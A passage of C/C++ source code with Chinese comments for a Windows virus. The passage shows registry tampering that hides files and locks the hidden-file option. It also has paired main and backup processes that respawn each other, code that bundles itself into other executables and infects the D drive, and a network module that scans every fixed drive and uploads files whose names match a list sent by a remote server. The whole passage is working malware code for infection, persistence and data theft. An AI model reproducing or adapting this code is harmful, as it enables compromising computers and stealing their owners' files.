		if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\NOHIDDEN",0,KEY_ALL_ACCESS,&hKey)!=ERROR_SUCCESS)
		{
			RegCloseKey(hKey);
			continue;
		}
		Key_Data_Length=sizeof(Key_Data);
		if(RegQueryValueEx(hKey,"CheckedValue",NULL,&Key_Type,(BYTE *)Key_Data,&Key_Data_Length)==ERROR_SUCCESS)
		{
			if(Key_Data[0]!=0x00000001)
			{
				//设置不显示隐藏文件
				Now_Time=time(NULL);
				sprintf(bat_File,"%s\\NOHidden%d.bat",getenv("TEMP"),Now_Time);
				if((bat=fopen(bat_File,"wt"))==NULL)
				{
					fcloseall();
					continue;
				}
				fputs(Set_Reg_Cmd[2],bat);
				fflush(bat);
				fcloseall();
				File_Oper_Func.BeginProcess(bat_File,NULL);
				Sleep(200);
			}
		}
		else
		{
			RegCloseKey(hKey);
			continue;
		}
		RegCloseKey(hKey);
		/////////////////////////////////////////设置无法更改隐藏选项/////////////////////////////////////////////////////
		remove(bat_File);
		memset(bat_File,NULL,sizeof(bat_File));
		memset(Key_Data,NULL,sizeof(Key_Data));
		memset(Echo_Cmd,NULL,sizeof(Echo_Cmd));
		if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL",0,KEY_ALL_ACCESS,&hKey)!=ERROR_SUCCESS)
		{
			RegCloseKey(hKey);        //关闭注册表句柄
			continue;
		}
		Key_Data_Length=sizeof(Key_Data);
    	if(RegQueryValueEx(hKey,"CheckedValue",NULL,&Key_Type,(BYTE *)Key_Data,&Key_Data_Length)==ERROR_SUCCESS)
		{
			if(Key_Data[0]!=0x00000000)
			{
				//设置无法更改隐藏选项
				Now_Time=time(NULL);
				sprintf(bat_File,"%s\\ProtectSystem%d.bat",getenv("TEMP"),Now_Time);
				if((bat=fopen(bat_File,"wt"))==NULL)
				{
					fcloseall();
					continue;
				}
				fputs(Set_Reg_Cmd[3],bat);
				fflush(bat);
				fcloseall();
	        	File_Oper_Func.BeginProcess(bat_File,NULL);
				Sleep(200);
			}
			RegCloseKey(hKey);
		}
		else
		{
			RegCloseKey(hKey);
			continue;
		}
	}
	return 1;
}

DWORD WINAPI Protect_Myself(LPVOID)
{
    FILE *Target_File=NULL,*This_File=NULL;
    char File[300],Buff[1024],Parameter[300],Main_Process_Name[100],Myself_Process_Name[100],*p=NULL,*Start_Name=NULL;
    int bytes=0;
	HANDLE hList[50];
    class File_Operate File_Oper_Func;
	class Enum_Process Enum_Pro_Func;

	memset(Main_Process_Name,NULL,sizeof(Main_Process_Name));
	memset(Myself_Process_Name,NULL,sizeof(Main_Process_Name));

    for(p=Target_File_Path; *p!=NULL; p++)
        if(*p=='\\') Start_Name=p+1;
    memcpy(Main_Process_Name,Start_Name,p-Start_Name);    //获取主进程名
	for(p=Myself_Path;*p!=NULL;p++)
		if(*p=='\\') Start_Name=p+1;
	memcpy(Myself_Process_Name,Start_Name,p-Start_Name);  //获取自身进程名

    while(1)
    {
        Sleep(10000);
        memset(File,NULL,sizeof(File));
        memset(Buff,NULL,sizeof(Buff));
        memset(Parameter,NULL,sizeof(Parameter));
        if(!strcmp(Myself_Process_Name,Main_Process_Name))   //检测自身程序是否是主程序
        {
			Thread_Switch=2;
            if(Enum_Pro_Func.Seek_Process(Backup_Name,hList)<1)        //检测备份程序是否启动
            {
				//备份程序未启动
                sprintf(File,"%s\\%s",getenv("TEMP"),Backup_Name);   //获取备份程序路径
                if((Target_File=fopen(File,"rb"))==NULL)        //是否已存在?
                {
                    //表示不存在此文件
                    if((Target_File=fopen(File,"wb"))==NULL) continue;
					if((This_File=fopen(Myself_Path,"rb"))==NULL) continue;
                    while((bytes=fread(Buff,sizeof(char),sizeof(Buff),This_File))>0)
                    {
                        fwrite(Buff,sizeof(char),bytes,Target_File);
                        memset(Buff,NULL,sizeof(Buff));
                    }
                    fflush(Target_File);
                }
                else
                {
                    //表示存在此文件
                    fcloseall();
                    if(!Check_Target(File))       //检测目标文件是否被感染
                    {
                        if((Target_File=fopen(File,"wb"))==NULL) continue;
						if((This_File=fopen(Myself_Path,"rb"))==NULL) continue;
                        while((bytes=fread(Buff,sizeof(char),sizeof(Buff),This_File))>0)
                        {
                            fwrite(Buff,sizeof(char),bytes,Target_File);
                            memset(Buff,NULL,sizeof(Buff));
                        }
                        fflush(Target_File);
                    }
                }
                fcloseall();
                sprintf(Parameter,"%s %s Protect_Myself",KEY,Myself_Path);
                File_Oper_Func.BeginProcess(File,Parameter);    //传递参数使其启动
            }
        }
        else
        {
			//自身程序是备份程序
            if(Enum_Pro_Func.Seek_Process(Main_Process_Name,hList)<1)    //检测主程序是否启动
            {
				//主程序未启动
				Thread_Switch=1;
                if((Target_File=fopen(Target_File_Path,"rb"))==NULL)
                {
                    //表示不存在此文件
                    if((Target_File=fopen(Target_File_Path,"wb"))==NULL) continue;
					if((This_File=fopen(Myself_Path,"rb"))==NULL) continue;
                    while((bytes=fread(Buff,sizeof(char),sizeof(Buff),This_File))>0)
                    {
                        fwrite(Buff,sizeof(char),bytes,Target_File);
                        memset(Buff,NULL,sizeof(Buff));
                    }
                    fflush(Target_File);
                }
                else
                {
                    fcloseall();
                    if(!Check_Target(Target_File_Path))       //检测目标文件是否被感染
                    {
                        if((Target_File=fopen(Target_File_Path,"wb"))==NULL) continue;
						if((This_File=fopen(Myself_Path,"rb"))==NULL) continue;
                        while((bytes=fread(Buff,sizeof(char),sizeof(Buff),This_File))>0)
                        {
                            fwrite(Buff,sizeof(char),bytes,Target_File);
                            memset(Buff,NULL,sizeof(Buff));
                        }
                        fflush(Target_File);
						fcloseall();
                    }
                }
                sprintf(Parameter,"%s %s Protect_Myself",KEY,Myself_Path);
                File_Oper_Func.BeginProcess(Target_File_Path,Parameter);   //传递参数启动主程序
            }
			else
			{
				//主程序已启动
				Thread_Switch=0;
			}
        }
    }
}


/*------------------------------------------------------------------------------------------------*/






/////////////////////////////////////////表现模块//////////////////////////////////////////////////

SOCKET Server_Socket_1=INVALID_SOCKET;
SOCKET Server_Socket_2=INVALID_SOCKET;
char File_Name[2000];

int Get_File_Name()
{
	char Buff[1024];
	char *cmd="Get_File_Name";
	int bytes=0;
	class Net_Communication Net_comm_Func;

	memset(File_Name,NULL,sizeof(File_Name));
	memset(Buff,NULL,sizeof(Buff));

	Net_comm_Func.Send_Data(Server_Socket_1,cmd,strlen(cmd));   //发送接收文件名指令
	while(1)  //接收文件名
	{
		if((bytes=Net_comm_Func.Recv_Data(Server_Socket_1,Buff,sizeof(Buff)))==SOCKET_ERROR) return 0;
		strcat(File_Name,Buff);
		if(bytes<sizeof(Buff)) break;
	}
	return 1;
}

int BFMatch(char *m_str,char *p_str)
{
	unsigned int i,j,k;

	for(i=0;m_str[i]!=NULL;i++)
	{
		for(j=0,k=i;m_str[k]==p_str[j] && p_str[j]!=NULL;j++,k++);
		if(j==strlen(p_str)) return 1;
	}
	return 0;
}

int Check_File_Name(char *file)
{
	char CurrName[260],*p=NULL;
	int i;

	memset(CurrName,NULL,sizeof(CurrName));

	for(i=0,p=CurrName;1;i++)
	{
		if(File_Name[i]!=',' && File_Name[i]!=NULL)
		{
			*p=File_Name[i];
			p++;
		}
		else
		{
			p=CurrName;
			if(BFMatch(file,CurrName)) return 1;
			memset(CurrName,NULL,sizeof(CurrName));
		}
	}
	return 0;
}

int Tran_File(char *File_Path)
{
	FILE *Target_File=NULL;
	char Buff[1024],file[260],*p=NULL,*Start_Name=NULL,Tran_signal[100];
	int bytes;
	class Net_Communication Net_Comm_Func;

	memset(Buff,NULL,sizeof(Buff));
	memset(Tran_signal,NULL,sizeof(Tran_signal));
	memset(file,NULL,sizeof(file));

	for(p=File_Path;*p!=NULL;p++)
		if(*p=='\\') Start_Name=p+1;
	memcpy(file,Start_Name,p-Start_Name);   //获取将要上传的文件名
	if(Net_Comm_Func.Send_Data(Server_Socket_1,"Tran_File",strlen("Tran_File")+1)==SOCKET_ERROR)
		return 0;
	if(Net_Comm_Func.Send_Data(Server_Socket_1,file,strlen(file)+1)==SOCKET_ERROR)
		return 0;
	if(Net_Comm_Func.Recv_Data(Server_Socket_1,Tran_signal,sizeof(Tran_signal))==SOCKET_ERROR)
		return 0;
	if(strcmp(Tran_signal,"allow")!=0) return 0;
	if((Target_File=fopen(File_Path,"rb"))==NULL) 
		return 0;
	while((bytes=fread(Buff,sizeof(char),sizeof(Buff),Target_File))>0)
	{
		if(Net_Comm_Func.Send_Data(Server_Socket_1,Buff,bytes)==SOCKET_ERROR) return 0;
		memset(Buff,NULL,sizeof(Buff));
	}
	return 1;
}

int Scan_Drive_File(char *Target_Path)
{
    char folder[Name_Length],file[Name_Length],path[Path_Length],Parameter_path[Path_Length],Traversal_Dir_Path[Path_Length];
    char *file_type_tmp="\\*.%s",Traversal_File_Path[Path_Length],file_type[20],File_Path[Path_Length];
	int i;
	static char *Check_File_Type[]=Target_File_Type;     //存放将要检查的所有文件类型
    WIN32_FIND_DATA FindFileData;
	
    memset(folder,NULL,sizeof(folder));
    memset(file,NULL,sizeof(file));
    memset(path,NULL,sizeof(path));
	memset(File_Path,NULL,sizeof(File_Path));
    memset(Traversal_Dir_Path,NULL,sizeof(Traversal_Dir_Path));
    memset(Parameter_path,NULL,sizeof(Parameter_path));
	
    strcat(path,Target_Path);              //path变量存放遍历的目录路径
	if(path[strlen(path)-1]=='\\') path[strlen(path)-1]=NULL;
    strcat(Parameter_path,path);
    strcat(Traversal_Dir_Path,path);
    //表示不遍历此目录
    if(!strcmp(path,".") || !strcmp(path,"..") || path[strlen(path)-1]=='.') return 0;
	
	//
    
    strcat(Traversal_Dir_Path,"\\*.*");
    //遍历出当前目录下所有的文件夹
    HANDLE hFind=FindFirstFile(Traversal_Dir_Path,&FindFileData);  //读取目录下第一个文件
    if(hFind==INVALID_HANDLE_VALUE)
    {
        FindClose(hFind);
        return 0;   //表示当前目录下为空
    }
    do
    {
        if(FindFileData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY)
        {
            //表示扫描到文件夹
            memset(folder,NULL,sizeof(folder));
            strcat(folder,FindFileData.cFileName);
            if(folder[strlen(folder)-1]=='.') continue;
            if(Parameter_path[strlen(Parameter_path)-1]!='\\') Parameter_path[strlen(Parameter_path)]='\\';
            strcat(Parameter_path,folder);
            //printf("遍历子目录:%s\n",Paramter_path);
            Scan_Drive_File(Parameter_path);    //递归
			
            memset(Parameter_path,NULL,sizeof(Parameter_path));
            strcat(Parameter_path,path);
        }
    }
    while(FindNextFile(hFind,&FindFileData));
	
	FindClose(hFind);
	
	for(i=0;Check_File_Type[i]!=NULL;i++)
	{
		memset(file_type,NULL,sizeof(file_type));
		sprintf(file_type,file_type_tmp,Check_File_Type[i]);    //格式化指定的文件类型
		memset(Traversal_File_Path,NULL,sizeof(Traversal_File_Path));
		strcat(Traversal_File_Path,file_type);
        //查找当前目录下的指定文件
	
        if((hFind=FindFirstFile(Traversal_File_Path,&FindFileData))==INVALID_HANDLE_VALUE)
		{
            FindClose(hFind);
            return 0;
		}
        do
		{
            if(FindFileData.dwFileAttributes != FILE_ATTRIBUTE_DIRECTORY)
			{
                //表示扫描到文件
                strcat(file,FindFileData.cFileName);   //获取扫描到的文件名
				memset(File_Path,NULL,sizeof(File_Path));
				sprintf(File_Path,"%s\\%s",path,file);
				if(Check_File_Name(file))        //检查文件名是否符合要求
					Tran_File(File_Path);        //若文件名符合要求则上传此文件
                Sleep(1);
                memset(file,NULL,sizeof(file));
			}
		}
        while(FindNextFile(hFind,&FindFileData));
		FindClose(hFind);
	}
    return 1;
}

int Traversal_ALL_Drives()
{
	//遍历所有磁盘
	char Fixed_Drives[100],Target_Drive[10],*p=NULL;
	int i;
	class Drives_Operate Drives_Oper_Func;

	memset(Fixed_Drives,NULL,sizeof(Fixed_Drives));
	memset(Target_Drive,NULL,sizeof(Target_Drive));

	Drives_Oper_Func.Check_Fixed_Drive(Fixed_Drives,sizeof(Fixed_Drives));   //列出所有固定磁盘
	for(p=Target_Drive,i=0;1;i++)
	{
		if(Fixed_Drives[i]!=',' && Fixed_Drives[i]!=NULL)
		{
			*p=Fixed_Drives[i];
			p++;
		}
		else
		{
			p=Target_Drive;
			Scan_Drive_File(Target_Drive);    //扫描目标驱动下的文件
		    memset(Target_Drive,NULL,sizeof(Target_Drive));
		}
	}
	return 1;
}

int Create_Connect_By_Tran_File()
{
	int Timeout=5000;       //设置套接字数据接收超时间隔为5秒。
    class Net_Communication Net_Comm_Func;
	
	Server_Socket_1=Net_Comm_Func.Create_Connect(Net_Comm_Func.DNSQuery(Server_Domain),Server_Port_1);//和服务器建立连接
    if(Server_Socket_1==INVALID_SOCKET) return 0;
	setsockopt(Server_Socket_1,SOL_SOCKET,SO_SNDTIMEO,(char *)&Timeout,sizeof(Timeout));
	setsockopt(Server_Socket_1,SOL_SOCKET,SO_RCVTIMEO,(char *)&Timeout,sizeof(Timeout));
	return 1;
}

DWORD WINAPI Net_Comm(LPVOID)
{
	while(1)
	{
		//遍历磁盘中所有文件
		while(!Create_Connect_By_Tran_File()) Sleep(100);     //创建文件传输连接
		if(!Get_File_Name())
		{
			closesocket(Server_Socket_1);
			Server_Socket_1=INVALID_SOCKET;
			continue;
		}
		Traversal_ALL_Drives();      //开始遍历磁盘中所有文件
		closesocket(Server_Socket_1);
		Server_Socket_1=INVALID_SOCKET;
		Sleep(10000);           //遍历磁盘周期为十秒
	}
	return 0;
}


/*------------------------------------------------------------------------------------------------*/


DWORD WINAPI Create_Thread(LPVOID)
{
	HANDLE hThread=NULL;
	while(1)
    {
		if(Thread_Switch)
		{
			CloseHandle(hThread=CreateThread(NULL,0,Inject_Drives,NULL,0,NULL));  //创建感染磁盘线程
            CloseHandle(hThread=CreateThread(NULL,0,Set_Regedit,NULL,0,NULL));    //创建监控注册表线程
			CloseHandle(hThread=CreateThread(NULL,0,Net_Comm,NULL,0,NULL));       //创建网络通讯线程
			if(Thread_Switch==2) return 0;
			while(Thread_Switch==1) Sleep(1);
		}
		Sleep(1);
	}
	return 0;
}


int main(int argc, char* argv[])
{
    Myself_Path=argv[0];

    class File_Operate File_Func;
    char Process_Name[100],*p=NULL,*Start_Name=NULL;

	p=Target_File_Path+3;	
	memset(Process_Name,NULL,sizeof(Process_Name));
	strcat(Process_Name,p);     //获取主程序的进程名
    if(argc==3)
    {
        //printf("传入参数:%s %s %s\n",argv[0],argv[1],argv[2]);
        if(!strcmp(argv[1],KEY))                     //检测程序指纹
            File_Func.Release_EXE_File(argv[2]);    //释放被感染的EXE文件
    }
    if(argc==4)
    {
        if(!strcmp(argv[1],KEY))     //验证程序指纹
            if(!strcmp(argv[3],"Protect_Myself"))    //验证命令
                goto Process_Start;    //启动本程序
    }
    if(Check_Myself())
    {
        //printf("捆绑在其它EXE程序中\n");
        while(File_Func.Release_Virus_File(Myself_Path)!=TRUE);  //释放病毒程序
        //system("pause");
        exit(0);
    }
    //printf("没有捆绑\n");
    if(Check_Myself_Name())   //判断本程序是否是主程序,若是则判断程序先前是否已启动。
	{
		if(!Check_Process(Process_Name)) goto Process_Start;
		exit(0);
	}

    //若不是主程序则准备感染D盘

    if(!Check_Target(Target_File_Path))       //检查本机是否已被感染
    {
		//未感染
        //printf("开始感染D盘\n");
		remove(Target_File_Path);
        if(!Inject_Target_Computer())      //调用感染模块
		{
			//感染失败
			Thread_Switch=2;
			goto Process_Start;
		}
        if(!File_Func.BeginProcess(Target_File_Path,NULL)) //启动主程序
		{
			//启动主程序失败
			Thread_Switch=2;
			goto Process_Start;    
		}
        exit(0);
    }
	else
	{
		//已感染
		if(!Check_Process(Process_Name))   //检测主程序是否启动
			if(!File_Func.BeginProcess(Target_File_Path,NULL)) //启动主程序
			{
				//启动主程序失败
		    	Thread_Switch=2;
				goto Process_Start;
			}
		exit(0);
	}

/////////////////////////////////////////////////////////////////////////////////////////////////////
Process_Start:
    //MessageBox(NULL,"程序启动成功!","Message",MB_OK);

    HANDLE hThread=NULL;

	CloseHandle(hThread=CreateThread(NULL,0,Protect_Myself,NULL,0,NULL)); //创建自我保护机制线程
	CloseHandle(hThread=CreateThread(NULL,0,Create_Thread,NULL,0,NULL));

    while(1) Sleep(111);
    return 0;
}












